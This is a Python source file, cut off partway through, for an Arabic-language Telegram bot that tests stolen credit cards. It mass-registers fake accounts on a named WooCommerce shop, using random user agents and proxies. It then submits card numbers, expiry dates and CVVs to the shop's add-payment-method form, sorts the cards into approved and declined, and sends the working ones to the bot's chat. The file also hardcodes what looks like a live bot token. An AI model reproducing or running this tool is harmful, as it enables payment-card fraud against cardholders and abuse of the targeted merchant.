from flask import Flask
from threading import Thread
import os
import requests
import re
import time
import random
import threading
import uuid
import shutil
from pathlib import Path
from colorama import Fore, Style, init
from queue import Queue
import fake_useragent
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import asyncio

# ==================== تهيئة Flask ====================
app = Flask('')

@app.route('/')
def home():
    return "✅ البوت شغال الحمدلله!"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    print("🌐 Flask server started")

# ==================== تهيئة الألوان ====================
init(autoreset=True)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFVj27YqwLI_na3YksvMcApJOopObTaIII"
TEMP_DIR = "temp_files"
os.makedirs(TEMP_DIR, exist_ok=True)

# متغيرات عامة
current_chat_id = None
current_bot = None
stop_checking = False
checking_active = False
checking_thread = None
auto_update_task = None

# متغيرات الإحصائيات
stats = {
    'total': 0,
    'checked': 0,
    'approved': 0,
    'declined': 0,
    'errors': 0,
    'start_time': 0,
    'current_account': 0,
    'total_accounts': 0,
    'current_account_cards': 0,
    'total_account_cards': 0,
    'current_email': '',
    'current_password': ''
}

# ==================== الكود الأصلي للأداة ====================

BASE_URL = "https://morgannasalchemy.com"
LOGIN_URL = f"{BASE_URL}/my-account/"
ADD_PAYMENT_URL = f"{BASE_URL}/my-account/add-payment-method/"

file_lock = threading.Lock()

def print_banner():
    print(Fore.RED + Style.BRIGHT + """
  =======================================================
  |                                                     |
  |           SCRIPT BY Obeida Trading                |
  |                                                     |
  =======================================================
""")

def generate_random_data():
    unique_id = str(uuid.uuid4())[:8]
    email = f"fuck_{unique_id}@example.com"
    password = f"Pass_{unique_id}!23"
    return email, password

class AuthorizeNetChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.user_agent = fake_useragent.UserAgent().random
        self.session.headers.update({"User-Agent": self.user_agent})
        self.current_email = None
        self.current_password = None

    def register(self):
        try:
            self.current_email, self.current_password = generate_random_data()
            print(f"{Fore.YELLOW}[*] تسجيل حساب جديد: {self.current_email}...")
            
            resp = self.session.get(LOGIN_URL, proxies=self.proxy, timeout=20)
            nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', resp.text)
            
            if not nonce_match:
                return False, "Could not find registration nonce"
            
            nonce = nonce_match.group(1)
            
            payload = {
                "email": self.current_email,
                "password": self.current_password,
                "woocommerce-register-nonce": nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register"
            }
            
            resp = self.session.post(LOGIN_URL, data=payload, proxies=self.proxy, timeout=30)
            
            if "Logout" in resp.text or "Dashboard" in resp.text or "My Account" in resp.text:
                print(f"{Fore.GREEN}✅ تم تسجيل الحساب بنجاح: {self.current_email}")
                return True, None
            else:
                return False, "Registration failed"
        except Exception as e:
            return False, str(e)

    def check_card(self, cc_line):
        try:
            if "|" not in cc_line:
                return "ERROR", "Invalid CC format"
            
            cc, mm, yy, cvv = cc_line.strip().split("|")
            exp_formatted = f"{mm} / {yy[-2:]}"
            
            resp = self.session.get(ADD_PAYMENT_URL, proxies=self.proxy, timeout=20)
            nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text)
            
            if not nonce_match:
                return "ERROR", "Could not find add-payment-method nonce"
            
            nonce = nonce_match.group(1)
            
            payload = {
                "payment_method": "yith_wcauthnet_credit_card_gateway",
                "yith_wcauthnet_credit_card_gateway-card-number": cc.replace(" ", "+"),
                "yith_wcauthnet_credit_card_gateway-card-expiry": exp_formatted,
                "yith_wcauthnet_credit_card_gateway-card-cvc": cvv,
                "yith_wcauthnet_credit_card_gateway-card-type": "",
                "woocommerce-add-payment-method-nonce": nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1"
            }
            
            resp = self.session.post(ADD_PAYMENT_URL, data=payload, proxies=self.proxy, timeout=30)
            
            if "Payment method successfully added" in resp.text:
                return "succeed", "Success"
            elif "declined" in resp.text.lower() or "error" in resp.text.lower():
                err_match = re.search(r'class="woocommerce-error" role="alert">(.*?)</ul>', resp.text, re.DOTALL)
                if err_match:
                    clean_err = re.sub('<[^<]+?>', '', err_match.group(1)).strip()
                    return "DECLINED", clean_err
                return "DECLINED", "Card Declined"
            else:
                return "DECLINED", "Unknown result"
                
        except Exception as e:
            return "ERROR", str(e)

# دالة إنشاء شريط التقدم
def create_progress_bar(percentage, width=20):
    filled = int(width * percentage / 100)
    bar = '▓' * filled + '░' * (width - filled)
    return f"`[{bar}]` {percentage:.1f}%"

# دالة حساب الوقت المنقضي
def format_time(seconds):
    hours = int(seconds // 3600)
    minutes = int((seconds % 3600) // 60)
    seconds = int(seconds % 60)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

# دالة إرسال البطاقة الصالحة فوراً
async def send_approved_instant(cc_line, msg, email, password, chat_id, bot):
    try:
        # تنسيق رقم البطاقة
        cc_parts = cc_line.split('|')
        card_number = cc_parts[0]
        formatted_card = ' '.join([card_number[i:i+4] for i in range(0, len(card_number), 4)])
        
        message = f"""
╔══════════════════════════════════╗
║     🎉 *بطاقة صالحة!* 🎉        ║
╠══════════════════════════════════╣
║ 💳 *بيانات البطاقة:*             ║
║ ┌────────────────────────────┐   ║
║ │ {formatted_card}           ║
║ │ {cc_parts[1]}/{cc_parts[2][-2:]}                  ║
║ │ CVV: {cc_parts[3]}                 ║
║ └────────────────────────────┘   ║
╠══════════════════════════════════╣
║ 📧 *الحساب المستخدم:*            ║
║ ┌────────────────────────────┐   ║
║ │ 📧 {email[:20]}...    ║
║ │ 🔑 {password[:15]}...       ║
║ └────────────────────────────┘   ║
╠══════════════════════════════════╣
║ 💬 *الحالة:* {msg}                ║
╚══════════════════════════════════╝"""

        await bot.send_message(
            chat_id=chat_id,
            text=message,
            parse_mode='Markdown'
        )
        print(f"{Fore.GREEN}[✓] تم إرسال البطاقة الصالحة فوراً: {cc_line}")
    except Exception as e:
        print(f"{Fore.RED}[✗] فشل إرسال البطاقة: {str(e)}")

# دالة إرسال تحديث الحالة
async def send_status_update(chat_id, bot):
    global stats
    
    if stats['total'] == 0:
        return
    
    checked = stats['checked']
    total = stats['total']
    percentage = (checked / total * 100) if total > 0 else 0
    progress_bar = create_progress_bar(percentage)
    
    # حساب الوقت
    elapsed = time.time() - stats['start_time'] if stats['start_time'] > 0 else 0
    elapsed_str = format_time(elapsed)
    
    if checked > 0 and elapsed > 0:
        speed = checked / (elapsed / 60)  # بطاقات في الدقيقة
        remaining_cards = total - checked
        eta = (remaining_cards / speed * 60) if speed > 0 else 0
        eta_str = format_time(eta)
    else:
        speed = 0
        eta_str = "00:00:00"
    
    status_text = "🟢 **نشط**" if checking_active else "🔴 **متوقف**"
    
    # تحديد معلومات الحساب الحالي
    current_account_info = ""
    if stats['current_account'] > 0 and stats['current_email']:
        current_account_info = f"""
║ 👤 *الحساب الحالي:*              ║
║ ┌────────────────────────────┐   ║
║ │ 📍 الحساب: {stats['current_account']}/{stats['total_accounts']}      ║
║ │ 📧 {stats['current_email'][:20]}...    ║
║ │ 📊 البطاقات: {stats['current_account_cards']}/{stats['total_account_cards']} ║
║ └────────────────────────────┘   ║"""
    
    message = f"""
╔══════════════════════════════════╗
║     📊 *الإحصائيات المباشرة*     ║
╠══════════════════════════════════╣
║ {status_text}                     ║
╠══════════════════════════════════╣
║ 📈 *التقدم العام:*                ║
║ {progress_bar}                    ║
║ 📁 تم فحص: `{checked}/{total}`    ║
╠══════════════════════════════════╣
║ ✅ *الناجحة:* `{stats['approved']}`     ║
║ ❌ *المرفوضة:* `{stats['declined']}`    ║
║ ⚠️ *الأخطاء:* `{stats['errors']}`      ║
╠══════════════════════════════════╣
║ ⏱️ *الوقت:*                       ║
║ ┌────────────────────────────┐   ║
║ │ المنقضي: {elapsed_str}        ║
║ │ المتبقي: {eta_str}            ║
║ │ السرعة: {speed:.1f} بط/دقيقة  ║
║ └────────────────────────────┘   ║{current_account_info}
╚══════════════════════════════════╝"""

    await bot.send_message(
        chat_id=chat_id,
        text=message,
        parse_mode='Markdown'
    )

# دالة إرسال تحديث كل دقيقة
async def auto_status_updater(chat_id, bot):
    global checking_active, stop_checking
    while checking_active and not stop_checking:
        await asyncio.sleep(60)  # انتظار دقيقة
        if checking_active and not stop_checking:
            await send_status_update(chat_id, bot)

# دالة إنشاء أزرار التحكم
def get_control_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("▶️ بدء الفحص", callback_data="start_scan"),
            InlineKeyboardButton("⏹️ إيقاف", callback_data="stop_scan")
        ],
        [
            InlineKeyboardButton("📊 الحالة", callback_data="show_status"),
            InlineKeyboardButton("📁 النتائج", callback_data="show_results")
        ],
        [
            InlineKeyboardButton("🧹 تنظيف", callback_data="cleanup"),
            InlineKeyboardButton("❓ مساعدة", callback_data="help")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def worker_single_file(chat_id, bot):
    """وظيفة المعالجة من ملف abood.txt"""
    global current_chat_id, current_bot, stop_checking, checking_active, stats, auto_update_task
    
    current_chat_id = chat_id
    current_bot = bot
    stop_checking = False
    checking_active = True
    
    # إعادة تعيين الإحصائيات
    stats = {
        'total': 0,
        'checked': 0,
        'approved': 0,
        'declined': 0,
        'errors': 0,
        'start_time': time.time(),
        'current_account': 0,
        'total_accounts': 0,
        'current_account_cards': 0,
        'total_account_cards': 0,
        'current_email': '',
        'current_password': ''
    }
    
    try:
        # قراءة الملف
        with open("abood.txt", "r", encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip()]
        
        if not lines:
            asyncio.run_coroutine_threadsafe(
                bot.send_message(chat_id=chat_id, text="❌ ملف abood.txt فارغ!"),
                asyncio.get_event_loop()
            )
            checking_active = False
            return False
        
        stats['total'] = len(lines)
        
        # تحديد عدد البطاقات لكل حساب (5 بطاقات)
        cards_per_account = 5
        stats['total_accounts'] = (len(lines) + cards_per_account - 1) // cards_per_account
        
        # حساب الوقت المتوقع
        estimated_time = stats['total_accounts'] * 150  # كل حساب حوالي 150 ثانية
        estimated_time_str = format_time(estimated_time)
        
        # إرسال رسالة بدء الفحص مع ملخص كامل
        start_message = f"""
╔══════════════════════════════════╗
║        🔍 *بدء الفحص*            ║
╠══════════════════════════════════╣
║ 📊 *ملخص البطاقات:*               ║
║ ┌────────────────────────────┐   ║
║ │ 📁 الإجمالي:      {stats['total']} بطاقة  ║
║ │ 👤 الحسابات:      {stats['total_accounts']} حساب   ║
║ │ 📊 لكل حساب:      {cards_per_account} بطاقات ║
║ │ ⏱️ الوقت المتوقع: {estimated_time_str} ║
║ └────────────────────────────┘   ║
╚══════════════════════════════════╝"""

        asyncio.run_coroutine_threadsafe(
            bot.send_message(
                chat_id=chat_id,
                text=start_message,
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            ),
            asyncio.get_event_loop()
        )
        
        # بدء التحديث التلقائي
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        auto_update_task = loop.create_task(auto_status_updater(chat_id, bot))
        
        print(f"{Fore.CYAN}تم العثور على {len(lines)} بطاقة في ملف abood.txt")
        print(f"{Fore.YELLOW}سيتم استخدام {stats['total_accounts']} حساب (كل حساب {cards_per_account} بطاقات)")
        
        for account_num in range(stats['total_accounts']):
            # التحقق من طلب الإيقاف
            if stop_checking:
                print(f"{Fore.YELLOW}⏹️ تم إيقاف الفحص بناءً على طلب المستخدم")
                
                stop_message = f"""
╔══════════════════════════════════╗
║     ⏹️ *تم إيقاف الفحص*         ║
╠══════════════════════════════════╣
║ 📊 *نتائج حتى الإيقاف:*          ║
╠══════════════════════════════════╣
║ 📁 تم فحص:          {stats['checked']}/{stats['total']} بطاقة ║
║ ✅ الناجحة:         {stats['approved']}          ║
║ ❌ المرفوضة:        {stats['declined']}          ║
║ ⚠️ الأخطاء:         {stats['errors']}           ║
╠══════════════════════════════════╣
║ 💾 *تم حفظ:*                     ║
║ • ✅ APPROVED.txt ({stats['approved']} بطاقة)   ║
║ • ❌ declined.txt ({stats['declined']} بطاقة)  ║
║ • ⚠️ error.txt ({stats['errors']} بطاقات)     ║
╚══════════════════════════════════╝"""
                
                asyncio.run_coroutine_threadsafe(
                    bot.send_message(
                        chat_id=chat_id,
                        text=stop_message,
                        parse_mode='Markdown',
                        reply_markup=get_control_keyboard()
                    ),
                    asyncio.get_event_loop()
                )
                break
            
            start_idx = account_num * cards_per_account
            end_idx = min(start_idx + cards_per_account, len(lines))
            account_cards = lines[start_idx:end_idx]
            
            stats['current_account'] = account_num + 1
            stats['total_account_cards'] = len(account_cards)
            stats['current_account_cards'] = 0
            
            print(f"\n{Fore.MAGENTA}{'='*60}")
            print(f"{Fore.YELLOW}🔄 إنشاء حساب رقم {account_num + 1}/{stats['total_accounts']}")
            
            # إرسال رسالة بدء الحساب الجديد
            account_start_message = f"""
╔══════════════════════════════════╗
║     📌 *الحساب {account_num + 1}/{stats['total_accounts']}*     ║
╠══════════════════════════════════╣
║ ⏳ جاري إنشاء حساب جديد...       ║
╚══════════════════════════════════╝"""
            
            asyncio.run_coroutine_threadsafe(
                bot.send_message(
                    chat_id=chat_id,
                    text=account_start_message,
                    parse_mode='Markdown'
                ),
                asyncio.get_event_loop()
            )
            
            # إنشاء حساب جديد
            checker = AuthorizeNetChecker()
            success, err = checker.register()
            
            if not success:
                print(f"{Fore.RED}❌ فشل تسجيل الحساب {account_num + 1}: {err}")
                
                fail_message = f"""
╔══════════════════════════════════╗
║     ❌ *فشل إنشاء الحساب*       ║
║        {account_num + 1}/{stats['total_accounts']}          ║
╠══════════════════════════════════╣
║ ⚠️ {err[:50]}...                  ║
╚══════════════════════════════════╝"""
                
                asyncio.run_coroutine_threadsafe(
                    bot.send_message(
                        chat_id=chat_id,
                        text=fail_message,
                        parse_mode='Markdown'
                    ),
                    asyncio.get_event_loop()
                )
                
                # حفظ البطاقات في error
                for cc_line in account_cards:
                    stats['errors'] += 1
                    stats['checked'] += 1
                    with file_lock:
                        with open("error.txt", "a", encoding="utf-8") as f:
                            f.write(f"{cc_line} - فشل إنشاء الحساب\n")
                continue
            
            # تحديث معلومات الحساب الحالي
            stats['current_email'] = checker.current_email
            stats['current_password'] = checker.current_password
            
            print(f"{Fore.CYAN}📌 الحساب {checker.current_email} يفحص {len(account_cards)} بطاقات")
            
            # إرسال رسالة نجاح إنشاء الحساب
            account_success_message = f"""
╔══════════════════════════════════╗
║     ✅ *تم إنشاء الحساب*        ║
║        {account_num + 1}/{stats['total_accounts']}          ║
╠══════════════════════════════════╣
║ 👤 *بيانات الحساب:*               ║
║ ┌────────────────────────────┐   ║
║ │ 📧 {checker.current_email[:30]}  ║
║ │ 🔑 {checker.current_password[:20]}   ║
║ └────────────────────────────┘   ║
║ 📊 بطاقات هذا الحساب: {len(account_cards)}   ║
╚══════════════════════════════════╝"""
            
            asyncio.run_coroutine_threadsafe(
                bot.send_message(
                    chat_id=chat_id,
                    text=account_success_message,
                    parse_mode='Markdown'
                ),
                asyncio.get_event_loop()
            )
            
            for i, cc_line in enumerate(account_cards, 1):
                # التحقق من طلب الإيقاف
                if stop_checking:
                    break
                
                stats['current_account_cards'] = i
                start_time_card = time.time()
                
                # تنسيق رقم البطاقة للعرض
                cc_parts_display = cc_line.split('|')
                card_num_display = cc_parts_display[0]
                formatted_card_display = ' '.join([card_num_display[j:j+4] for j in range(0, len(card_num_display), 4)])
                
                print(f"\n{Fore.WHITE}[الحساب {account_num + 1} - بطاقة {i}/{len(account_cards)}] جاري فحص: {cc_line}")
                
                # إرسال رسالة بدء فحص البطاقة
                card_start_message = f"""
╔══════════════════════════════════╗
║     💳 *البطاقة {i}/{len(account_cards)}*         ║
║     في الحساب {account_num + 1}/{stats['total_accounts']}           ║
╠══════════════════════════════════╣
║ الرقم: `{formatted_card_display}`    ║
║ التاريخ: {cc_parts_display[1]}|{cc_parts_display[2][-2:]}              ║
║ الرمز: {cc_parts_display[3]}                        ║
╚══════════════════════════════════╝"""
                
                asyncio.run_coroutine_threadsafe(
                    bot.send_message(
                        chat_id=chat_id,
                        text=card_start_message,
                        parse_mode='Markdown'
                    ),
                    asyncio.get_event_loop()
                )
                
                status, msg = checker.check_card(cc_line)
                elapsed_time = time.time() - start_time_card
                
                # تحديث الإحصائيات
                stats['checked'] += 1
                
                with file_lock:
                    if status == "succeed":
                        print(f"{Fore.GREEN}[✅ APPROVED] {cc_line} - {msg}")
                        with open("APPROVED.txt", "a", encoding="utf-8") as f: 
                            f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                        stats['approved'] += 1
                        
                        # إرسال البطاقة الصالحة فوراً
                        asyncio.run_coroutine_threadsafe(
                            send_approved_instant(cc_line, msg, checker.current_email, checker.current_password, chat_id, bot),
                            asyncio.get_event_loop()
                        )
                        
                    elif status == "DECLINED":
                        print(f"{Fore.RED}[❌ DECLINED] {cc_line} - {msg}")
                        with open("declined.txt", "a", encoding="utf-8") as f: 
                            f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                        stats['declined'] += 1
                        
                        # إرسال رسالة الرفض
                        declined_message = f"""
╔══════════════════════════════════╗
║     ❌ *بطاقة مرفوضة*           ║
╠══════════════════════════════════╣
║ الرقم: `{formatted_card_display}`    ║
║ السبب: {msg[:50]}...              ║
╚══════════════════════════════════╝"""
                        
                        asyncio.run_coroutine_threadsafe(
                            bot.send_message(
                                chat_id=chat_id,
                                text=declined_message,
                                parse_mode='Markdown'
                            ),
                            asyncio.get_event_loop()
                        )
                        
                    else:
                        print(f"{Fore.WHITE}[⚠️ ERROR] {cc_line} - {msg}")
                        with open("error.txt", "a", encoding="utf-8") as f: 
                            f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                        stats['errors'] += 1
                        
                        # إرسال رسالة الخطأ
                        error_message = f"""
╔══════════════════════════════════╗
║     ⚠️ *خطأ في الفحص*           ║
╠══════════════════════════════════╣
║ الرقم: `{formatted_card_display}`    ║
║ الخطأ: {msg[:50]}...              ║
╚══════════════════════════════════╝"""
                        
                        asyncio.run_coroutine_threadsafe(
                            bot.send_message(
                                chat_id=chat_id,
                                text=error_message,
                                parse_mode='Markdown'
                            ),
                            asyncio.get_event_loop()
                        )
                
                # إرسال تحديث كل 5 بطاقات
                if stats['checked'] % 5 == 0:
                    asyncio.run_coroutine_threadsafe(
                        send_status_update(chat_id, bot),
                        asyncio.get_event_loop()
                    )
                
                # انتظار 20 ثانية قبل البطاقة التالية
                if i < len(account_cards) and not stop_checking:
                    wait_time = 20
                    remaining_wait = max(0, wait_time - elapsed_time)
                    
                    if remaining_wait > 0:
                        print(f"{Fore.BLUE}⏳ انتظار {remaining_wait:.1f} ثانية...")
                        
                        # إرسال رسالة الانتظار
                        wait_message = f"""
⏳ *انتظار {int(remaining_wait)} ثانية قبل البطاقة التالية...*"""
                        
                        asyncio.run_coroutine_threadsafe(
                            bot.send_message(
                                chat_id=chat_id,
                                text=wait_message,
                                parse_mode='Markdown'
                            ),
                            asyncio.get_event_loop()
                        )
                        
                        # انتظار مع التحقق من الإيقاف
                        for _ in range(int(remaining_wait)):
                            if stop_checking:
                                break
                            time.sleep(1)
            
            # حفظ معلومات الحساب
            with file_lock:
                with open("accounts_summary.txt", "a", encoding="utf-8") as f:
                    f.write(f"\n=== الحساب {account_num + 1}: {checker.current_email} | الباسورد: {checker.current_password} | تم فحص {len(account_cards)} بطاقات ===\n")
                    
                    # حساب نتائج هذا الحساب
                    account_approved = sum(1 for line in open("APPROVED.txt", "r", encoding='utf-8') if checker.current_email in line) if os.path.exists("APPROVED.txt") else 0
                    account_declined = sum(1 for line in open("declined.txt", "r", encoding='utf-8') if checker.current_email in line) if os.path.exists("declined.txt") else 0
                    account_errors = sum(1 for line in open("error.txt", "r", encoding='utf-8') if checker.current_email in line) if os.path.exists("error.txt") else 0
                    
                    f.write(f"نتائج الحساب: ✅ {account_approved} | ❌ {account_declined} | ⚠️ {account_errors}\n")
                    f.write("="*50 + "\n")
            
            # إرسال ملخص الحساب
            account_summary = f"""
╔══════════════════════════════════╗
║   ✅ *اكتمال الحساب {account_num + 1}/{stats['total_accounts']}*    ║
╠══════════════════════════════════╣
║ 📧 *بيانات الحساب:*              ║
║ ┌────────────────────────────┐   ║
║ │ 📧 {checker.current_email[:30]}  ║
║ │ 🔑 {checker.current_password[:20]}   ║
║ └────────────────────────────┘   ║
╠══════════════════════════════════╣
║ 📊 *نتائج هذا الحساب:*           ║
║ ┌────────────────────────────┐   ║
║ │ ✅ الناجحة:    {account_approved}           ║
║ │ ❌ المرفوضة:   {account_declined}           ║
║ │ ⚠️ الأخطاء:    {account_errors}           ║
║ │ 📈 نسبة نجاح:  {(account_approved/len(account_cards)*100):.1f}%     ║
║ └────────────────────────────┘   ║
╠══════════════════════════════════╣
║ 📈 *الإحصائيات الكلية الجديدة:*  ║
║ ✅ الناجحة: {stats['approved'] - account_approved} ← {stats['approved']} ║
║ ❌ المرفوضة: {stats['declined'] - account_declined} ← {stats['declined']} ║
╚══════════════════════════════════╝"""
            
            asyncio.run_coroutine_threadsafe(
                bot.send_message(
                    chat_id=chat_id,
                    text=account_summary,
                    parse_mode='Markdown'
                ),
                asyncio.get_event_loop()
            )
            
            print(f"{Fore.GREEN}✅ الحساب {account_num + 1} اكتمل.")
            
            # انتظار 10 ثواني قبل الحساب الجديد
            if account_num < stats['total_accounts'] - 1 and not stop_checking:
                print(f"{Fore.YELLOW}⏱️ انتظار 10 ثواني قبل الحساب التالي...")
                
                wait_message = f"""
⏳ *انتظار 10 ثواني قبل إنشاء الحساب التالي...*"""
                
                asyncio.run_coroutine_threadsafe(
                    bot.send_message(
                        chat_id=chat_id,
                        text=wait_message,
                        parse_mode='Markdown'
                    ),
                    asyncio.get_event_loop()
                )
                
                for _ in range(10):
                    if stop_checking:
                        break
                    time.sleep(1)
        
        # إرسال النتائج النهائية
        if not stop_checking:
            # حساب السرعة المتوسطة
            elapsed_total = time.time() - stats['start_time']
            avg_speed = stats['total'] / (elapsed_total / 60) if elapsed_total > 0 else 0
            
            final_message = f"""
╔══════════════════════════════════╗
║     🎉 *اكتمل الفحص!* 🎉        ║
╠══════════════════════════════════╣
║ 📊 *النتائج النهائية:*           ║
╠══════════════════════════════════╣
║ 📁 إجمالي البطاقات:   {stats['total']}       ║
║ 👤 إجمالي الحسابات:   {stats['total_accounts']}       ║
╠══════════════════════════════════╣
║ ✅ *الناجحة:*    {stats['approved']}             ║
║ ❌ *المرفوضة:*   {stats['declined']}             ║
║ ⚠️ *الأخطاء:*    {stats['errors']}              ║
╠══════════════════════════════════╣
║ ⏱️ *الوقت:*                      ║
║ • المنقضي: {format_time(elapsed_total)}            ║
║ • السرعة: {avg_speed:.1f} بط/دقيقة    ║
╠══════════════════════════════════╣
║ 📁 *الملفات المتاحة:*           ║
║ • ✅ APPROVED.txt              ║
║ • ❌ declined.txt              ║
║ • ⚠️ error.txt                 ║
║ • 📋 accounts_summary.txt      ║
╚══════════════════════════════════╝"""
            
            asyncio.run_coroutine_threadsafe(
                bot.send_message(
                    chat_id=chat_id,
                    text=final_message,
                    parse_mode='Markdown',
                    reply_markup=get_control_keyboard()
                ),
                asyncio.get_event_loop()
            )
            
            # إرسال ملف APPROVED.txt
            if os.path.exists("APPROVED.txt") and os.path.getsize("APPROVED.txt") > 0:
                with open("APPROVED.txt", "rb") as f:
                    asyncio.run_coroutine_threadsafe(
                        bot.send_document(
                            chat_id=chat_id, 
                            document=f, 
                            filename="APPROVED.txt",
                            caption="✅ البطاقات الصالحة",
                            reply_markup=get_control_keyboard()
                        ),
                        asyncio.get_event_loop()
                    )
            
            print(f"\n{Fore.GREEN}{'='*60}")
            print(f"{Fore.GREEN}🎉 تم الانتهاء من فحص جميع البطاقات!")
        
        checking_active = False
        if auto_update_task:
            auto_update_task.cancel()
        return True
        
    except FileNotFoundError:
        print(f"{Fore.RED}ملف abood.txt مش موجود!")
        asyncio.run_coroutine_threadsafe(
            bot.send_message(chat_id=chat_id, text="❌ ملف abood.txt غير موجود!", reply_markup=get_control_keyboard()),
            asyncio.get_event_loop()
        )
        checking_active = False
        return False
    except Exception as e:
        print(f"{Fore.RED}حصل خطأ: {str(e)}")
        asyncio.run_coroutine_threadsafe(
            bot.send_message(chat_id=chat_id, text=f"❌ حدث خطأ: {str(e)[:200]}", reply_markup=get_control_keyboard()),
            asyncio.get_event_loop()
        )
        checking_active = False
        return False

# ==================== دوال البوت ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """رسالة الترحيب مع أزرار"""
    welcome_msg = """
╔══════════════════════════════════╗
║     🤖 *مرحباً بك في*            ║
║    *بوت فحص البطاقات*            ║
╠══════════════════════════════════╣
║ 📁 أرسل لي ملف `abood.txt`        ║
║    لبدء الفحص                    ║
╠══════════════════════════════════╣
║ ✨ *مميزات البوت:*                ║
║ • إرسال فوري للبطاقات الصالحة    ║
║ • إحصائيات مباشرة مع شريط تقدم   ║
║ • عرض تفصيلي لكل حساب وبطاقة     ║
║ • تحديث تلقائي كل دقيقة          ║
║ • أزرار تحكم كاملة               ║
║ • إيقاف الفحص بأمان              ║
╚══════════════════════════════════╝

📝 *صيغة الملف المطلوبة:*
`4111111111111111|12|2025|123`"""
    
    await update.message.reply_text(
        welcome_msg, 
        parse_mode='Markdown',
        reply_markup=get_control_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج الضغط على الأزرار"""
    query = update.callback_query
    await query.answer()
    
    global checking_active, stop_checking, checking_thread, stats, auto_update_task
    
    if query.data == "start_scan":
        if checking_active:
            await query.edit_message_text(
                text="⚠️ *الفحص قيد التشغيل بالفعل*\nاستخدم زر الإيقاف إذا أردت إيقافه",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
        else:
            if not os.path.exists("abood.txt"):
                await query.edit_message_text(
                    text="❌ *ملف abood.txt غير موجود*\nالرجاء إرسال الملف أولاً",
                    parse_mode='Markdown',
                    reply_markup=get_control_keyboard()
                )
            else:
                await query.edit_message_text(
                    text="🔄 *جاري بدء الفحص...*\nسيتم عرض التفاصيل قريباً",
                    parse_mode='Markdown'
                )
                # بدء الفحص في ثريد منفصل
                checking_thread = threading.Thread(
                    target=worker_single_file,
                    args=(query.message.chat_id, context.bot)
                )
                checking_thread.start()
    
    elif query.data == "stop_scan":
        if checking_active:
            # إظهار تأكيد الإيقاف
            keyboard = [
                [
                    InlineKeyboardButton("✅ نعم، أوقف", callback_data="confirm_stop"),
                    InlineKeyboardButton("❌ لا، استمر", callback_data="cancel_stop")
                ]
            ]
            await query.edit_message_text(
                text="⚠️ *هل أنت متأكد من إيقاف الفحص؟*\nسيتم حفظ النتائج حتى الآن",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await query.edit_message_text(
                text="⏸️ *لا يوجد فحص قيد التشغيل*",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "confirm_stop":
        global stop_checking
        stop_checking = True
        if auto_update_task:
            auto_update_task.cancel()
        await query.edit_message_text(
            text="⏹️ *جاري إيقاف الفحص...*\nالرجاء الانتظار قليلاً",
            parse_mode='Markdown'
        )
    
    elif query.data == "cancel_stop":
        await query.edit_message_text(
            text="✅ *تم إلغاء الإيقاف*\nالفحص مستمر",
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )
    
    elif query.data == "show_status":
        await send_status_update(query.message.chat_id, context.bot)
        await query.delete()
    
    elif query.data == "show_results":
        keyboard = [
            [
                InlineKeyboardButton("✅ APPROVED", callback_data="get_approved"),
                InlineKeyboardButton("❌ DECLINED", callback_data="get_declined")
            ],
            [
                InlineKeyboardButton("⚠️ ERRORS", callback_data="get_errors"),
                InlineKeyboardButton("📁 ACCOUNTS", callback_data="get_accounts")
            ],
            [
                InlineKeyboardButton("🔙 رجوع", callback_data="back_to_menu")
            ]
        ]
        await query.edit_message_text(
            text="📁 *اختر ملف النتائج الذي تريد تحميله:*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "get_approved":
        if os.path.exists("APPROVED.txt") and os.path.getsize("APPROVED.txt") > 0:
            with open("APPROVED.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="APPROVED.txt",
                    caption="✅ البطاقات الصالحة"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد بطاقات صالحة بعد",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "get_declined":
        if os.path.exists("declined.txt") and os.path.getsize("declined.txt") > 0:
            with open("declined.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="declined.txt",
                    caption="❌ البطاقات المرفوضة"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد بطاقات مرفوضة بعد",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "get_errors":
        if os.path.exists("error.txt") and os.path.getsize("error.txt") > 0:
            with open("error.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="error.txt",
                    caption="⚠️ الأخطاء"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد أخطاء بعد",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "get_accounts":
        if os.path.exists("accounts_summary.txt") and os.path.getsize("accounts_summary.txt") > 0:
            with open("accounts_summary.txt", "rb") as f:
